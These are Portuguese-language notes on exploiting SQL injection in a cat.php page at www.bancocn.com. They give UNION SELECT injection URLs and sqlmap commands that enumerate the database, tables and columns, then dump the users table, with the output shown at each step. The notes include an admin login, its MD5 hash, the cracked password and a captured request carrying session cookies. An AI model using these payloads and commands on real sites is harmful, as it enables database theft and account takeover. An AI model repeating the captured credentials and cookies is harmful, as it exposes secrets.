# Explorando SQL Injection

## ORDER BY
- possui 3 colunas

## UNION ALL SELECT
### Nome do banco de dados
- ```http://www.bancocn.com/cat.php?id=-1 union select 1, 2, database()```

- ```schema_name from information_schema.schemata```

- ```http://www.bancocn.com/cat.php?id=-1%20union%20select%201,%202,%20group_concat(schema_name)%20from%20information_schema.schemata```

    - RESPOSTA: information_schema,bancocn
    
### Nome das tabelas
- ```http://www.bancocn.com/cat.php?id=-1%20union%20select%201,%202,%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22bancocn%22```

    - RESPOSTA: categories,pictures,stats,users
    
### Nome das colunas
- ```http://www.bancocn.com/cat.php?id=-1%20union%20select%201,%202,%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%22bancocn%22%20and%20table_name=%22users%22```

    - RESPOSTA: id,login,password

### Dados de login
    http://www.bancocn.com/cat.php?id=-1%20union%20select%201,%202,%20group_concat(id,%22%20:%20%22,%20login,%22%20:%20%22,%20password)%20from%20bancocn.users

    Resposta: 1 : admin : 7b71be0e85318117d2e514ce2a2e222c

    id = 1
    login = admin
    password = 7b71be0e85318117d2e514ce2a2e222c

    usar o https://hashkiller.co.uk/md5-decrypter.aspx para descobrir a senha
    password: 7b71be0e85318117d2e514ce2a2e222c MD5 : senhafoda

########################################################################################################################
GET cat.php?id=3 HTTP/1.1
Host: www.bancocn.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Cookie: __cfduid=dd2f7c8788ca26fb6567db34a9bb12d5a1503287015; cf_clearance=803efaa5872012739bbc3947e0c4e2d153ea36c4-1503290688-3600; PHPSESSID=7905qrdhof3gvlchcmp5l0umh6; cf_use_ob=0
Connection: keep-alive
########################################################################################################################

TERMINAL: 

    :: Saber o nome dos bancos de dados

        nano header.txt
        sqlmap -r header.txt --dbs --dbms=mysql

        Resposta:
            available databases [2]:                                                       
            [*] bancocn
            [*] information_schema


    :: Saber o nome das tabelas:
    
        sqlmap -r header.txt --dbs --dbms=mysql -D bancocn --tables

        Resposta:
            Database: bancocn                                                                                      
            [4 tables]
            +------------+
            | categories |
            | pictures   |
            | stats      |
            | users      |
            +------------+
    :: Saber os campos de uma tabela

        sqlmap -r header.txt --dbs --dbms=mysql -D bancocn -T users --columns

        Resposta:
            Database: bancocn                                                                                      
            Table: users
            [3 columns]
            +----------+--------------+
            | Column   | Type         |
            +----------+--------------+
            | id       | mediumint(9) |
            | login    | varchar(50)  |
            | password | varchar(50)  |
            +----------+--------------+
    
    :: Acessar a informações da tabela

        sqlmap -r header.txt --dbs --dbms=mysql -D bancocn -T users -C login,password --dump 

        Resposta:
            Database: bancocn
            Table: users
            [1 entry]
            +-------+----------------------------------+
            | login | password                         |
            +-------+----------------------------------+
            | admin | 7b71be0e85318117d2e514ce2a2e222c |
            +-------+----------------------------------+
